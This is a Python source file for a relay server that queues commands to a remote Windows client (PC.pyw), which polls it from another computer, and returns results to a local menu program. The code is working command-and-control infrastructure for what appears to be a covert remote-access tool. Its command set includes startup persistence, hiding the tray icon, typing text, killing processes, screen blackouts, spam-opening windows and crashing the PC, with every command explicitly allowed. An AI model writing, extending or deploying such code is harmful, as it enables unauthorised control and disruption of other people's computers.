"""
relay_server.py - Relay that runs on YOUR PC

PC.pyw on the other computer connects OUTBOUND to this relay.
MENU.pyw on your computer connects to this relay locally.

Run on YOUR PC:
    py relay_server.py

This version allows EVERY command. No locks, no blocked commands.
"""

from __future__ import annotations

import json
import secrets
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any

HOST = "0.0.0.0"
PORT = 9000

# Same token must be in relay_server.py, MENU.pyw, and PC.pyw.
RELAY_TOKEN = "thefirstaccievercreated164thefirstaccievercreated165thefirstaccievercreated166"

# Any command is allowed. This dict is kept for compatibility.
SAFE_COMMAND_FLAGS: dict[str, bool] = {
    "status": True,
    "log": True,
    "message": True,
    "startup_add": True,
    "startup_remove": True,
    "lock": True,
    "open_url": True,
    "set_tray_visible": True,
    "stop": True,
    "sleep": True,
    "hibernate": True,
    "restart": True,
    "shutdown": True,
    "logoff": True,
    "cancel_shutdown": True,
    "set_volume": True,
    "kill_process": True,
    "type_text": True,
    "blackout": True,
    "spam_open": True,
    "flip_screen": True,
    "crash": True,
    "crash_pc": True,
}

# Nothing is ever blocked.
BLOCKED_COMMANDS: dict[str, str] = {}

# device_id -> info
DEVICES: dict[str, dict[str, Any]] = {}
# device_id -> list of queued command dicts
QUEUES: dict[str, list[dict[str, Any]]] = {}
# command_id -> result dict
RESULTS: dict[str, dict[str, Any]] = {}
LOCK = threading.Lock()


def now() -> float:
    return time.time()


def json_bytes(obj: Any) -> bytes:
    return json.dumps(obj, indent=2).encode("utf-8")


def local_ip() -> str:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except Exception:
        return "127.0.0.1"


def clean_old_results() -> None:
    cutoff = now() - 3600
    with LOCK:
        for command_id in list(RESULTS.keys()):
            if RESULTS[command_id].get("time", 0) < cutoff:
                RESULTS.pop(command_id, None)


def command_allowed(action: str) -> tuple[bool, str]:
    """
    No locks. Every non-empty command is allowed.
    """
    if not action:
        return False, "Missing action"
    return True, "Allowed"


def enabled_commands() -> list[str]:
    return sorted(SAFE_COMMAND_FLAGS.keys())


def locked_safe_commands() -> list[str]:
    return []


class RelayHandler(BaseHTTPRequestHandler):
    server_version = "PCTRelay/1.1"

    def log_message(self, fmt: str, *args: Any) -> None:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {self.client_address[0]} - " + (fmt % args))

    def send_json(self, code: int, obj: Any) -> None:
        body = json_bytes(obj)
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def read_json(self) -> dict[str, Any]:
        length = int(self.headers.get("Content-Length", "0") or "0")
        if length <= 0:
            return {}
        raw = self.rfile.read(min(length, 100_000))
        try:
            return json.loads(raw.decode("utf-8"))
        except Exception:
            return {}

    def auth_ok(self, data: dict[str, Any]) -> bool:
        supplied = str(data.get("token", ""))
        return secrets.compare_digest(supplied, RELAY_TOKEN)

    def do_GET(self) -> None:
        if self.path == "/health":
            self.send_json(
                200,
                {
                    "ok": True,
                    "server": "PCT relay",
                    "time": now(),
                    "enabled_commands": enabled_commands(),
                    "locked_safe_commands": locked_safe_commands(),
                    "always_blocked_commands": sorted(BLOCKED_COMMANDS.keys()),
                },
            )
            return
        self.send_json(404, {"ok": False, "error": "Unknown endpoint"})

    def do_POST(self) -> None:
        clean_old_results()
        data = self.read_json()

        if not self.auth_ok(data):
            self.send_json(403, {"ok": False, "error": "Bad token"})
            return

        path = self.path.rstrip("/")

        # --------------------------
        # PC.pyw endpoints
        # --------------------------
        if path == "/pc/hello":
            device_id = str(data.get("device_id", "")).strip()
            if not device_id:
                self.send_json(400, {"ok": False, "error": "Missing device_id"})
                return

            info = dict(data.get("info", {}))
            with LOCK:
                current = DEVICES.get(device_id, {})
                current.update(info)
                current["device_id"] = device_id
                current["last_seen"] = now()
                current["remote_addr"] = self.client_address[0]
                DEVICES[device_id] = current
                QUEUES.setdefault(device_id, [])

            self.send_json(200, {"ok": True})
            return

        if path == "/pc/poll":
            device_id = str(data.get("device_id", "")).strip()
            status = dict(data.get("status", {}))
            if not device_id:
                self.send_json(400, {"ok": False, "error": "Missing device_id"})
                return

            with LOCK:
                current = DEVICES.get(device_id, {})
                current.update(status)
                current["device_id"] = device_id
                current["last_seen"] = now()
                current["remote_addr"] = self.client_address[0]
                DEVICES[device_id] = current

                commands = QUEUES.setdefault(device_id, [])[:]
                QUEUES[device_id].clear()

            self.send_json(200, {"ok": True, "commands": commands})
            return

        if path == "/pc/result":
            device_id = str(data.get("device_id", "")).strip()
            command_id = str(data.get("command_id", "")).strip()
            result = data.get("result", {})
            if not device_id or not command_id:
                self.send_json(400, {"ok": False, "error": "Missing device_id or command_id"})
                return

            with LOCK:
                RESULTS[command_id] = {
                    "device_id": device_id,
                    "command_id": command_id,
                    "result": result,
                    "time": now(),
                }
                if device_id in DEVICES:
                    DEVICES[device_id]["last_seen"] = now()

            self.send_json(200, {"ok": True})
            return

        # --------------------------
        # MENU.pyw endpoints
        # --------------------------
        if path == "/menu/devices":
            with LOCK:
                devices = list(DEVICES.values())
                for device in devices:
                    last_seen = float(device.get("last_seen", 0))
                    device["online"] = (now() - last_seen) < 15
                    device["seconds_since_seen"] = round(now() - last_seen, 1)

            devices.sort(key=lambda x: str(x.get("computer", "")).lower())
            self.send_json(
                200,
                {
                    "ok": True,
                    "devices": devices,
                    "enabled_commands": enabled_commands(),
                    "locked_safe_commands": locked_safe_commands(),
                    "always_blocked_commands": sorted(BLOCKED_COMMANDS.keys()),
                },
            )
            return

        if path == "/menu/command":
            device_id = str(data.get("device_id", "")).strip()
            action = str(data.get("action", "")).strip()
            args = dict(data.get("args", {}))

            if not device_id or not action:
                self.send_json(400, {"ok": False, "error": "Missing device_id or action"})
                return

            ok, reason = command_allowed(action)
            if not ok:
                self.send_json(400, {"ok": False, "error": reason})
                return

            command_id = secrets.token_hex(12)
            command = {
                "command_id": command_id,
                "action": action,
                "args": args,
                "created": now(),
            }

            with LOCK:
                if device_id not in DEVICES:
                    self.send_json(404, {"ok": False, "error": "Unknown device"})
                    return
                QUEUES.setdefault(device_id, []).append(command)

            self.send_json(200, {"ok": True, "command_id": command_id})
            return

        if path == "/menu/results":
            command_id = str(data.get("command_id", "")).strip()
            with LOCK:
                if command_id:
                    result = RESULTS.get(command_id)
                    self.send_json(200, {"ok": True, "result": result})
                else:
                    self.send_json(200, {"ok": True, "results": list(RESULTS.values())[-50:]})
            return

        self.send_json(404, {"ok": False, "error": "Unknown endpoint"})


def main() -> None:
    print("PCT relay server")
    print(f"Listening on http://0.0.0.0:{PORT}")
    print(f"Local test URL on this PC: http://127.0.0.1:{PORT}")
    print(f"Same-WiFi/Tailscale/LAN URL from another PC: http://{local_ip()}:{PORT}")
    print()
    print("ALL COMMANDS ARE ALLOWED")
    print()
    print("Keep this window open while monitoring.")
    print()

    server = ThreadingHTTPServer((HOST, PORT), RelayHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Stopping relay...")
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
